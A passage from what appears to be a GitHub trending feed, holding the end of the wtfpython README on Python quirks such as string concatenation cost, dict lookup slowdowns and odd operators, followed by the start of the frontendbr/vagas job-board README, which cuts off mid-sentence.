&lt;p&gt;Don&#39;t use &lt;code&gt;+&lt;/code&gt; for generating long strings — In Python, &lt;code&gt;str&lt;/code&gt; is immutable, so the left and right strings have to be copied into the new string for every pair of concatenations. If you concatenate four strings of length 10, you&#39;ll be copying (10+10) + ((10+10)+10) + (((10+10)+10)+10) = 90 characters instead of just 40 characters. Things get quadratically worse as the number and size of the string increases (justified with the execution times of &lt;code&gt;add_bytes_with_plus&lt;/code&gt; function)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Therefore, it&#39;s advised to use &lt;code&gt;.format.&lt;/code&gt; or &lt;code&gt;%&lt;/code&gt; syntax (however, they are slightly slower than &lt;code&gt;+&lt;/code&gt; for very short strings).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Or better, if already you&#39;ve contents available in the form of an iterable object, then use &lt;code&gt;&#39;&#39;.join(iterable_object)&lt;/code&gt; which is much faster.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Unlike &lt;code&gt;add_bytes_with_plus&lt;/code&gt; because of the &lt;code&gt;+=&lt;/code&gt; optimizations discussed in the previous example, &lt;code&gt;add_string_with_plus&lt;/code&gt; didn&#39;t show a quadratic increase in execution time. Had the statement been &lt;code&gt;s = s + &#34;x&#34; + &#34;y&#34; + &#34;z&#34;&lt;/code&gt; instead of &lt;code&gt;s += &#34;xyz&#34;&lt;/code&gt;, the increase would have been quadratic.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def add_string_with_plus(iters):&#xA;    s = &#34;&#34;&#xA;    for i in range(iters):&#xA;        s = s + &#34;x&#34; + &#34;y&#34; + &#34;z&#34;&#xA;    assert len(s) == 3*iters&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n100 add_string_with_plus(1000)&#xA;388 µs ± 22.4 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit -n100 add_string_with_plus(10000) # Quadratic increase in execution time&#xA;9 ms ± 298 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So many ways to format and create a giant string are somewhat in contrast to the &lt;a href=&#34;https://www.python.org/dev/peps/pep-0020/&#34;&gt;Zen of Python&lt;/a&gt;, according to which,&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;There should be one-- and preferably only one --obvious way to do it.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Slowing down &lt;code&gt;dict&lt;/code&gt; lookups *&lt;/h3&gt; &#xA;&lt;!-- Example ID: c9c26ce6-df0c-47f7-af0b-966b9386d4c3 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_dict = {str(i): 1 for i in range(1_000_000)}&#xA;another_dict = {str(i): 1 for i in range(1_000_000)}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; %timeit some_dict[&#39;5&#39;]&#xA;28.6 ns ± 0.115 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; some_dict[1] = 1&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit some_dict[&#39;5&#39;]&#xA;37.2 ns ± 0.265 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit another_dict[&#39;5&#39;]&#xA;28.5 ns ± 0.142 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&amp;gt;&amp;gt;&amp;gt; another_dict[1]  # Trying to access a key that doesn&#39;t exist&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;KeyError: 1&#xA;&amp;gt;&amp;gt;&amp;gt; %timeit another_dict[&#39;5&#39;]&#xA;38.5 ns ± 0.0913 ns per loop (mean ± std. dev. of 7 runs, 10000000 loops each)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Why are same lookups becoming slower?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CPython has a generic dictionary lookup function that handles all types of keys (&lt;code&gt;str&lt;/code&gt;, &lt;code&gt;int&lt;/code&gt;, any object ...), and a specialized one for the common case of dictionaries composed of &lt;code&gt;str&lt;/code&gt;-only keys.&lt;/li&gt; &#xA; &lt;li&gt;The specialized function (named &lt;code&gt;lookdict_unicode&lt;/code&gt; in CPython&#39;s &lt;a href=&#34;https://github.com/python/cpython/raw/522691c46e2ae51faaad5bbbce7d959dd61770df/Objects/dictobject.c#L841&#34;&gt;source&lt;/a&gt;) knows all existing keys (including the looked-up key) are strings, and uses the faster &amp;amp; simpler string comparison to compare keys, instead of calling the &lt;code&gt;__eq__&lt;/code&gt; method.&lt;/li&gt; &#xA; &lt;li&gt;The first time a &lt;code&gt;dict&lt;/code&gt; instance is accessed with a non-&lt;code&gt;str&lt;/code&gt; key, it&#39;s modified so future lookups use the generic function.&lt;/li&gt; &#xA; &lt;li&gt;This process is not reversible for the particular &lt;code&gt;dict&lt;/code&gt; instance, and the key doesn&#39;t even have to exist in the dictionary. That&#39;s why attempting a failed lookup has the same effect.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;▶ Bloating instance &lt;code&gt;dict&lt;/code&gt;s *&lt;/h3&gt; &#xA;&lt;!-- Example ID: fe706ab4-1615-c0ba-a078-76c98cbe3f48 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import sys&#xA;&#xA;class SomeClass:&#xA;    def __init__(self):&#xA;        self.some_attr1 = 1&#xA;        self.some_attr2 = 2&#xA;        self.some_attr3 = 3&#xA;        self.some_attr4 = 4&#xA;&#xA;&#xA;def dict_size(o):&#xA;    return sys.getsizeof(o.__dict__)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; (Python 3.8, other Python 3 versions may vary a little)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; o2 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;104&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o2)&#xA;104&#xA;&amp;gt;&amp;gt;&amp;gt; del o1.some_attr1&#xA;&amp;gt;&amp;gt;&amp;gt; o3 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o3)&#xA;232&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;232&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Let&#39;s try again... In a new interpreter:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; o2 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;104  # as expected&#xA;&amp;gt;&amp;gt;&amp;gt; o1.some_attr5 = 5&#xA;&amp;gt;&amp;gt;&amp;gt; o1.some_attr6 = 6&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o1)&#xA;360&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o2)&#xA;272&#xA;&amp;gt;&amp;gt;&amp;gt; o3 = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; dict_size(o3)&#xA;232&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;What makes those dictionaries become bloated? And why are newly created objects bloated as well?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CPython is able to reuse the same &#34;keys&#34; object in multiple dictionaries. This was added in &lt;a href=&#34;https://www.python.org/dev/peps/pep-0412/&#34;&gt;PEP 412&lt;/a&gt; with the motivation to reduce memory usage, specifically in dictionaries of instances - where keys (instance attributes) tend to be common to all instances.&lt;/li&gt; &#xA; &lt;li&gt;This optimization is entirely seamless for instance dictionaries, but it is disabled if certain assumptions are broken.&lt;/li&gt; &#xA; &lt;li&gt;Key-sharing dictionaries do not support deletion; if an instance attribute is deleted, the dictionary is &#34;unshared&#34;, and key-sharing is disabled for all future instances of the same class.&lt;/li&gt; &#xA; &lt;li&gt;Additionaly, if the dictionary keys have been resized (because new keys are inserted), they are kept shared &lt;em&gt;only&lt;/em&gt; if they are used by a exactly single dictionary (this allows adding many attributes in the &lt;code&gt;__init__&lt;/code&gt; of the very first created instance, without causing an &#34;unshare&#34;). If multiple instances exist when a resize happens, key-sharing is disabled for all future instances of the same class: CPython can&#39;t tell if your instances are using the same set of attributes anymore, and decides to bail out on attempting to share their keys.&lt;/li&gt; &#xA; &lt;li&gt;A small tip, if you aim to lower your program&#39;s memory footprint: don&#39;t delete instance attributes, and make sure to initialize all attributes in your &lt;code&gt;__init__&lt;/code&gt;!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;▶ Minor Ones *&lt;/h3&gt; &#xA;&lt;!-- Example ID: f885cb82-f1e4-4daa-9ff3-972b14cb1324 ---&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;join()&lt;/code&gt; is a string operation instead of list operation. (sort of counter-intuitive at first usage)&lt;/p&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; If &lt;code&gt;join()&lt;/code&gt; is a method on a string, then it can operate on any iterable (list, tuple, iterators). If it were a method on a list, it&#39;d have to be implemented separately by every type. Also, it doesn&#39;t make much sense to put a string-specific method on a generic &lt;code&gt;list&lt;/code&gt; object API.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Few weird looking but semantically correct statements:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;[] = ()&lt;/code&gt; is a semantically correct statement (unpacking an empty &lt;code&gt;tuple&lt;/code&gt; into an empty &lt;code&gt;list&lt;/code&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;&#39;a&#39;[0][0][0][0][0]&lt;/code&gt; is also a semantically correct statement as strings are &lt;a href=&#34;https://docs.python.org/3/glossary.html#term-sequence&#34;&gt;sequences&lt;/a&gt;(iterables supporting element access using integer indices) in Python.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;3 --0-- 5 == 8&lt;/code&gt; and &lt;code&gt;--5 == 5&lt;/code&gt; are both semantically correct statements and evaluate to &lt;code&gt;True&lt;/code&gt;.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Given that &lt;code&gt;a&lt;/code&gt; is a number, &lt;code&gt;++a&lt;/code&gt; and &lt;code&gt;--a&lt;/code&gt; are both valid Python statements but don&#39;t behave the same way as compared with similar statements in languages like C, C++, or Java.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = 5&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;5&#xA;&amp;gt;&amp;gt;&amp;gt; ++a&#xA;5&#xA;&amp;gt;&amp;gt;&amp;gt; --a&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;There is no &lt;code&gt;++&lt;/code&gt; operator in Python grammar. It is actually two &lt;code&gt;+&lt;/code&gt; operators.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;++a&lt;/code&gt; parses as &lt;code&gt;+(+a)&lt;/code&gt; which translates to &lt;code&gt;a&lt;/code&gt;. Similarly, the output of the statement &lt;code&gt;--a&lt;/code&gt; can be justified.&lt;/li&gt; &#xA;   &lt;li&gt;This StackOverflow &lt;a href=&#34;https://stackoverflow.com/questions/3654830/why-are-there-no-and-operators-in-python&#34;&gt;thread&lt;/a&gt; discusses the rationale behind the absence of increment and decrement operators in Python.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You must be aware of the Walrus operator in Python. But have you ever heard about &lt;em&gt;the space-invader operator&lt;/em&gt;?&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = 42&#xA;&amp;gt;&amp;gt;&amp;gt; a -=- 1&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;43&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;It is used as an alternative incrementation operator, together with another one&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a +=+ 1&#xA;&amp;gt;&amp;gt;&amp;gt; a&#xA;&amp;gt;&amp;gt;&amp;gt; 44&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; This prank comes from &lt;a href=&#34;https://twitter.com/raymondh/status/1131103570856632321?lang=en&#34;&gt;Raymond Hettinger&#39;s tweet&lt;/a&gt;. The space invader operator is actually just a malformatted &lt;code&gt;a -= (-1)&lt;/code&gt;. Which is equivalent to &lt;code&gt;a = a - (- 1)&lt;/code&gt;. Similar for the &lt;code&gt;a += (+ 1)&lt;/code&gt; case.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python has an undocumented &lt;a href=&#34;https://en.wikipedia.org/wiki/Converse_implication&#34;&gt;converse implication&lt;/a&gt; operator.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; False ** False == True&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; False ** True == False&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; True ** False == True&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; True ** True == True&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; If you replace &lt;code&gt;False&lt;/code&gt; and &lt;code&gt;True&lt;/code&gt; by 0 and 1 and do the maths, the truth table is equivalent to a converse implication operator. (&lt;a href=&#34;https://github.com/cosmologicon/pywat/raw/master/explanation.md#the-undocumented-converse-implication-operator&#34;&gt;Source&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Since we are talking operators, there&#39;s also &lt;code&gt;@&lt;/code&gt; operator for matrix multiplication (don&#39;t worry, this time it&#39;s for real).&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import numpy as np&#xA;&amp;gt;&amp;gt;&amp;gt; np.array([2, 2, 2]) @ np.array([7, 8, 8])&#xA;46&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;💡 Explanation:&lt;/strong&gt; The &lt;code&gt;@&lt;/code&gt; operator was added in Python 3.5 keeping the scientific community in mind. Any object can overload &lt;code&gt;__matmul__&lt;/code&gt; magic method to define behavior for this operator.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;From Python 3.8 onwards you can use a typical f-string syntax like &lt;code&gt;f&#39;{some_var=}&lt;/code&gt; for quick debugging. Example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_string = &#34;wtfpython&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; f&#39;{some_string=}&#39;&#xA;&#34;some_string=&#39;wtfpython&#39;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Python uses 2 bytes for local variable storage in functions. In theory, this means that only 65536 variables can be defined in a function. However, python has a handy solution built in that can be used to store more than 2^16 variable names. The following code demonstrates what happens in the stack when more than 65536 local variables are defined (Warning: This code prints around 2^18 lines of text, so be prepared!):&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import dis&#xA;exec(&#34;&#34;&#34;&#xA;def f():&#xA;   &#34;&#34;&#34; + &#34;&#34;&#34;&#xA;   &#34;&#34;&#34;.join([&#34;X&#34; + str(x) + &#34;=&#34; + str(x) for x in range(65539)]))&#xA;&#xA;f()&#xA;&#xA;print(dis.dis(f))&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Multiple Python threads won&#39;t run your &lt;em&gt;Python code&lt;/em&gt; concurrently (yes, you heard it right!). It may seem intuitive to spawn several threads and let them execute your Python code concurrently, but, because of the &lt;a href=&#34;https://wiki.python.org/moin/GlobalInterpreterLock&#34;&gt;Global Interpreter Lock&lt;/a&gt; in Python, all you&#39;re doing is making your threads execute on the same core turn by turn. Python threads are good for IO-bound tasks, but to achieve actual parallelization in Python for CPU-bound tasks, you might want to use the Python &lt;a href=&#34;https://docs.python.org/3/library/multiprocessing.html&#34;&gt;multiprocessing&lt;/a&gt; module.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Sometimes, the &lt;code&gt;print&lt;/code&gt; method might not print values immediately. For example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# File some_file.py&#xA;import time&#xA;&#xA;print(&#34;wtfpython&#34;, end=&#34;_&#34;)&#xA;time.sleep(3)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;This will print the &lt;code&gt;wtfpython&lt;/code&gt; after 3 seconds due to the &lt;code&gt;end&lt;/code&gt; argument because the output buffer is flushed either after encountering &lt;code&gt;\n&lt;/code&gt; or when the program finishes execution. We can force the buffer to flush by passing &lt;code&gt;flush=True&lt;/code&gt; argument.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;List slicing with out of the bounds indices throws no errors&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = [1, 2, 3, 4, 5]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list[111:]&#xA;[]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Slicing an iterable not always creates a new object. For example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_str = &#34;wtfpython&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_list = [&#39;w&#39;, &#39;t&#39;, &#39;f&#39;, &#39;p&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_list is some_list[:] # False expected because a new object is created.&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; some_str is some_str[:] # True because strings are immutable, so making a new object is of not much use.&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;int(&#39;١٢٣٤٥٦٧٨٩&#39;)&lt;/code&gt; returns &lt;code&gt;123456789&lt;/code&gt; in Python 3. In Python, Decimal characters include digit characters, and all characters that can be used to form decimal-radix numbers, e.g. U+0660, ARABIC-INDIC DIGIT ZERO. Here&#39;s an &lt;a href=&#34;https://chris.improbable.org/2014/8/25/adventures-in-unicode-digits/&#34;&gt;interesting story&lt;/a&gt; related to this behavior of Python.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You can separate numeric literals with underscores (for better readability) from Python 3 onwards.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; six_million = 6_000_000&#xA;&amp;gt;&amp;gt;&amp;gt; six_million&#xA;6000000&#xA;&amp;gt;&amp;gt;&amp;gt; hex_address = 0xF00D_CAFE&#xA;&amp;gt;&amp;gt;&amp;gt; hex_address&#xA;4027435774&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;&#39;abc&#39;.count(&#39;&#39;) == 4&lt;/code&gt;. Here&#39;s an approximate implementation of &lt;code&gt;count&lt;/code&gt; method, which would make the things more clear&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def count(s, sub):&#xA;    result = 0&#xA;    for i in range(len(s) + 1 - len(sub)):&#xA;        result += (s[i:i + len(sub)] == sub)&#xA;    return result&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;The behavior is due to the matching of empty substring(&lt;code&gt;&#39;&#39;&lt;/code&gt;) with slices of length 0 in the original string.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;A few ways in which you can contribute to wtfpython,&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Suggesting new examples&lt;/li&gt; &#xA; &lt;li&gt;Helping with translation (See &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues?q=is%3Aissue+is%3Aopen+label%3Atranslation&#34;&gt;issues labeled translation&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Minor corrections like pointing out outdated snippets, typos, formatting errors, etc.&lt;/li&gt; &#xA; &lt;li&gt;Identifying gaps (things like inadequate explanation, redundant examples, etc.)&lt;/li&gt; &#xA; &lt;li&gt;Any creative suggestions to make this project more fun and useful&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt; for more details. Feel free to create a new &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/new&#34;&gt;issue&lt;/a&gt; to discuss things.&lt;/p&gt; &#xA;&lt;p&gt;PS: Please don&#39;t reach out with backlinking requests, no links will be added unless they&#39;re highly relevant to the project.&lt;/p&gt; &#xA;&lt;h1&gt;Acknowledgements&lt;/h1&gt; &#xA;&lt;p&gt;The idea and design for this collection were initially inspired by Denys Dovhan&#39;s awesome project &lt;a href=&#34;https://github.com/denysdovhan/wtfjs&#34;&gt;wtfjs&lt;/a&gt;. The overwhelming support by Pythonistas gave it the shape it is in right now.&lt;/p&gt; &#xA;&lt;h4&gt;Some nice Links!&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=sH4XF6pKKmk&#34;&gt;https://www.youtube.com/watch?v=sH4XF6pKKmk&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.reddit.com/r/Python/comments/3cu6ej/what_are_some_wtf_things_about_python&#34;&gt;https://www.reddit.com/r/Python/comments/3cu6ej/what_are_some_wtf_things_about_python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sopython.com/wiki/Common_Gotchas_In_Python&#34;&gt;https://sopython.com/wiki/Common_Gotchas_In_Python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/530530/python-2-x-gotchas-and-landmines&#34;&gt;https://stackoverflow.com/questions/530530/python-2-x-gotchas-and-landmines&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/1011431/common-pitfalls-in-python&#34;&gt;https://stackoverflow.com/questions/1011431/common-pitfalls-in-python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.python.org/doc/humor/&#34;&gt;https://www.python.org/doc/humor/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cosmologicon/pywat#the-undocumented-converse-implication-operator&#34;&gt;https://github.com/cosmologicon/pywat#the-undocumented-converse-implication-operator&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.codementor.io/satwikkansal/python-practices-for-efficient-code-performance-memory-and-usability-aze6oiq65&#34;&gt;https://www.codementor.io/satwikkansal/python-practices-for-efficient-code-performance-memory-and-usability-aze6oiq65&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/wemake-services/wemake-python-styleguide/search?q=wtfpython&amp;amp;type=Issues&#34;&gt;https://github.com/wemake-services/wemake-python-styleguide/search?q=wtfpython&amp;amp;type=Issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;WFTPython discussion threads on &lt;a href=&#34;https://news.ycombinator.com/item?id=21862073&#34;&gt;Hacker News&lt;/a&gt; and &lt;a href=&#34;https://www.reddit.com/r/programming/comments/edsh3q/what_the_fck_python_30_exploring_and/&#34;&gt;Reddit&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;🎓 License&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.wtfpl.net&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-WTFPL%202.0-lightgrey.svg?style=flat-square&#34; alt=&#34;WTFPL 2.0&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;© &lt;a href=&#34;https://satwikkansal.xyz&#34;&gt;Satwik Kansal&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Surprise your friends as well!&lt;/h2&gt; &#xA;&lt;p&gt;If you like wtfpython, you can use these quick links to share it with your friends,&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://twitter.com/intent/tweet?url=https://github.com/satwikkansal/wtfpython&amp;amp;text=If%20you%20really%20think%20you%20know%20Python,%20think%20once%20more!%20Check%20out%20wtfpython&amp;amp;hashtags=python,wtfpython&#34;&gt;Twitter&lt;/a&gt; | &lt;a href=&#34;https://www.linkedin.com/shareArticle?url=https://github.com/satwikkansal&amp;amp;title=What%20the%20f*ck%20Python!&amp;amp;summary=If%20you%20really%20thing%20you%20know%20Python,%20think%20once%20more!&#34;&gt;Linkedin&lt;/a&gt; | &lt;a href=&#34;https://www.facebook.com/dialog/share?app_id=536779657179021&amp;amp;display=page&amp;amp;href=https%3A%2F%2Fgithub.com%2Fsatwikkansal%2Fwtfpython&amp;amp;quote=If%20you%20really%20think%20you%20know%20Python%2C%20think%20once%20more!&#34;&gt;Facebook&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Need a pdf version?&lt;/h2&gt; &#xA;&lt;p&gt;I&#39;ve received a few requests for the pdf (and epub) version of wtfpython. You can add your details &lt;a href=&#34;https://satwikkansal.xyz/wtfpython-pdf/&#34;&gt;here&lt;/a&gt; to get them as soon as they are finished.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;That&#39;s all folks!&lt;/strong&gt; For upcoming content like this, you can add your email &lt;a href=&#34;https://www.satwikkansal.xyz/content-like-wtfpython/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>frontendbr/vagas</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/frontendbr/vagas</id>
    <link href="https://github.com/frontendbr/vagas" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🔬 Espaço para divulgação de vagas para front-enders.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/frontendbr/brand/raw/main/src/png/logo-600px--horizontal--color.png&#34; width=&#34;400&#34; alt=&#34;Front-end Brasil&#34;&gt; &lt;/p&gt; &#xA;&lt;h1 align=&#34;center&#34;&gt;Vagas&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;span&gt;🔬&lt;/span&gt; Espaço para divulgação de vagas para front-enders.&lt;/p&gt; &#xA;&lt;h1&gt;Vagas (Somente vagas de Front-End)&lt;/h1&gt; &#xA;&lt;p&gt;Espaço para a divulgação de vagas para desenvolvedores via &lt;em&gt;issues&lt;/em&gt; do Github.&lt;/p&gt; &#xA;&lt;p&gt;Vagas disponíveis em &lt;a href=&#34;https://github.com/frontendbr/vagas/issues&#34;&gt;https://github.com/frontendbr/vagas/issues&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Cadastrando uma vaga&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Abra uma &lt;strong&gt;issue&lt;/strong&gt; e, no título desta &lt;em&gt;issue&lt;/em&gt;, coloque o nome da cidade entre colchetes seguido do nome da vaga e nome da empresa.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Exemplo: &lt;code&gt;[São Paulo] Front-End Developer na [NOME DA 